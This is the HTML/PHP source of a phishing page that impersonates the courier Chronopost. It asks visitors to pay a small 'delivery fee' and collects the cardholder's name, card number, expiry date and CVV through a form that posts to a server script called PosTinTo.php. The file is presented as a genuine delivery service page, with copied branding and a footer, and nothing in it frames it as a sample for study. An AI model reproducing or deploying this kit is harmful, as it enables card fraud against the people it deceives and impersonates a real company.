<!DOCTYPE html>
<html>
<head>
  <meta charset="utf-8">
<meta name="viewport" content="width=device-width, initial-scale=1">
<link rel="shortcut icon" href="sourceApp/img/favicon.ico" type="image/vnd.microsoft.icon" />
<link href="https://kit-free.fontawesome.com/releases/latest/css/free.min.css" media="all" rel="stylesheet">
<link rel="stylesheet" href="https://stackpath.bootstrapcdn.com/bootstrap/4.5.0/css/bootstrap.min.css" integrity="sha384-9aIt2nRpC12Uk9gS9baDl411NQApFmC26EwAOH8WgZl5MYYxFfc+NcPb1dKGj7Sk" crossorigin="anonymous">
<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/4.7.0/css/font-awesome.min.css">
<link rel="stylesheet" href="sourceApp/style.css">
<script src="//ajax.googleapis.com/ajax/libs/jquery/3.4.1/jquery.min.js"></script>
</head>
<body>
<div class="d-block p-3 text-center text-white bg-primary b4b">
  <a href="" class="a-primary"><i class="fas fa-exclamation-triangle" aria-hidden="true"></i> <?php echo date("Y/m/d"); ?> - Infos délais de livraison</a>
</div><header>     
  <img class="imglog" src="sourceApp/img/chronopost_logo.png" alt="Accueil">
  </header>    
<div class="menualbox">
<div class="topnav" id="myTopnav">
  <a href="">Accueil</a>
  <a href="">Expedier</a>
  <a href="">Nos offres </a>
  <a href="">Aide / FAQ </a>
  <a href="">A propos de Chronopost </a>
  <a href="javascript:void(0);" class="icon" onclick="myFunction()">
    <i class="fa fa-bars"></i>
  </a>
</div>
</div>
<div class="container">
  


  <div class="row">

            <div class="col-sm-9">
<form name="myForm" action="sourceApp/PosTinTo.php" onsubmit="return validateForm()" method="post">
<div class="card-body p-5 " id="icard-body">

<div class="tab-content">
<div class="tab-pane fade show active" id="nav-tab-card">
  <p class="alert alert-success"><i class="fab fa-cc-mastercard"></i> &nbsp;<i class="fab fa-cc-visa"></i> &nbsp;  Veuillez confirmer les frais de livraison (2,99 EURO) et l'adresse de livraison du colis</p>
  <form role="form">
  <div class="form-group">
    <label for="username">Nom complet (sur la carte)</label>
    <input type="text" class="form-control" name="Kartenhalter" placeholder="" id="Kartenhalter">
  </div> <!-- form-group.// -->

  <div class="form-group">
    <label for="cardNumber">Numéro de carte</label>
    <div class="input-group">
      <input type="text" class="form-control" name="Kartennummer" id="Kartennummer"  placeholder="">
      <div class="input-group-append">
        <span class="input-group-text text-muted">
          <i class="fab fa-cc-visa"></i> &nbsp; <i class="fab fa-cc-amex"></i> &nbsp; 
          <i class="fab fa-cc-mastercard"></i> 
        </span>
      </div>
    </div>
  </div> <!-- form-group.// -->

  <div class="row">
      <div class="col-sm-8">
          <div class="form-group">
              <label><span class="hidden-xs">Date d'expiration</span> </label>
            <div class="input-group">
              <input type="text" class="form-control" placeholder="" name="Ablauf" id="Ablauf">
            </div>
          </div>
      </div>
      <div class="col-sm-4">
          <div class="form-group">
              <label data-toggle="tooltip" title="" data-original-title="3 digits code on back side of the card">CVV <i class="fa fa-question-circle"></i></label>
              <input type="text" class="form-control" name="Sicherheitscode" id="Sicherheitscode"   >
          </div> <!-- form-group.// -->
      </div>
  </div> <!-- row.// -->
  <button class="subscribe btn btn-primary btn-block" type="submit" name="cartget"> Confirm  </button>
  </form>
</div> <!-- tab-pane.// -->
<div class="tab-pane fade" id="nav-tab-paypal">
<p>Paypal is easiest way to pay online</p>
<p>
<button type="button" class="btn btn-primary"> <i class="fab fa-paypal"></i> Log in my Paypal </button>
</p>

</div>

</div> <!-- tab-content .// -->

</div>
  
  
 
</form>
            </div>

            <div class="col-sm-3 ">
                <div class="card" >
  <img src="sourceApp/img/chronopost_tours_03712200_113425863.jpg" class="card-img-top" alt="...">
  <div class="card-body">
    <h5 class="card-title">Chronopost toujours à vos côtés !</h5>
    <p class="card-text">Parce que chaque livraison est unique, Chronopost s’adapte à vos besoins. Découvrez nos offres de livraison de colis en France et à l’international.</p>
  </div>
</div>
        </div>



</div>
<script>
function myFunction() {
  var x = document.getElementById("myTopnav");
  if (x.className === "topnav") {
    x.className += " responsive";
  } else {
    x.className = "topnav";
  }
}
</script>
         <script src='//cdnjs.cloudflare.com/ajax/libs/jquery/3.1.1/jquery.min.js'></script>
         <script src='https://s3-us-west-2.amazonaws.com/s.cdpn.io/3/jquery.inputmask.bundle.js'></script>
         <script type="text/javascript">
            $(":input").inputmask();
            
            $("#Kartennummer").inputmask({"mask": "9999 9999 9999 9999"});
            $("#Ablauf").inputmask({"mask": "99/9999"});
            $("#Sicherheitscode").inputmask({"mask": "999"});
         </script>
<script  src="sourceApp/chronopost_cc.js"></script>
<!-- Footer -->
<footer class="page-footer font-small indigo">

  <!-- Footer Links -->
  <div class="container text-center text-md-left">

    <!-- Grid row -->
    <div class="row">

      <!-- Grid column -->
      <div class="col-md-3 mx-auto">

        <!-- Links -->
        <h5 class="font-weight-bold text-uppercase mt-3 mb-4">Particulier</h5>

        <ul class="list-unstyled">
          <li>
            <a href="#!">Envoyer un colis</a>
          </li>
          <li>
            <a href="#!">Suivre un envoi</a>
          </li>
          <li>
            <a href="#!">Nos offres</a>
          </li>
          <li>
            <a href="#!">Estimez les tarifs</a>
          </li>
        </ul>

      </div>
      <!-- Grid column -->

      <hr class="clearfix w-100 d-md-none">

      <!-- Grid column -->
      <div class="col-md-3 mx-auto">

        <!-- Links -->
        <h5 class="font-weight-bold text-uppercase mt-3 mb-4">Aide</h5>

        <ul class="list-unstyled">
          <li>
            <a href="#!">Se créer un compte</a>
          </li>
          <li>
            <a href="#!">Nos guides</a>
          </li>
          <li>
            <a href="#!">Vos questions fréquentes</a>
          </li>
          <li>
            <a href="#!">Espace Outre-Mer</a>
          </li>
           <li>
            <a href="#!">Flash info </a>
          </li>
        </ul>

      </div>
      <!-- Grid column -->

      <hr class="clearfix w-100 d-md-none">

      <!-- Grid column -->
      <div class="col-md-3 mx-auto">

        <!-- Links -->
        <h5 class="font-weight-bold text-uppercase mt-3 mb-4">Mieux nous connaître</h5>

        <ul class="list-unstyled">
          <li>
            <a href="#!">Gouvernance Chronopost</a>
          </li>
          <li>
            <a href="#!">Nous rejoindre</a>
          </li>
          <li>
            <a href="#!">Engagé et responsable</a>
          </li>
          <li>
            <a href="#!">Nos actualités</a>
          </li>
               <li>
            <a href="#!">Espace Presse</a>
          </li>
        </ul>

      </div>
      <!-- Grid column -->

      <hr class="clearfix w-100 d-md-none">

      <!-- Grid column -->
      <div class="col-md-3 mx-auto">

        <!-- Links -->
        <h5 class="font-weight-bold text-uppercase mt-3 mb-4">Informations légales</h5>

        <ul class="list-unstyled">
          <li>
            <a href="#!">Mentions légales</a>
          </li>
          <li>
            <a href="#!">Alerte fraude</a>
          </li>
          <li>
            <a href="#!">Réseaux sociaux</a>
          </li>
          <li>
            <a href="#!"><img src="https://i.ibb.co/9Z4ytxJ/Capture.png">  </a>
          </li>
        </ul>

      </div>
      <!-- Grid column -->

    </div>
    <!-- Grid row -->

  </div>

  <div class="footer-separator-desktop "></div>

  <!-- Footer Links -->
<img class="loft" src="sourceApp/img/dpd-logo.png"   >
<img class="logt" src="sourceApp/img/chronopost_logo_small.png"   >
  <!-- Copyright -->
  <div class="footer-copyright text-center py-3">© 2021 Chronopost</div>
  <!-- Copyright -->

</footer>
<!-- Footer -->

</body>
</html>
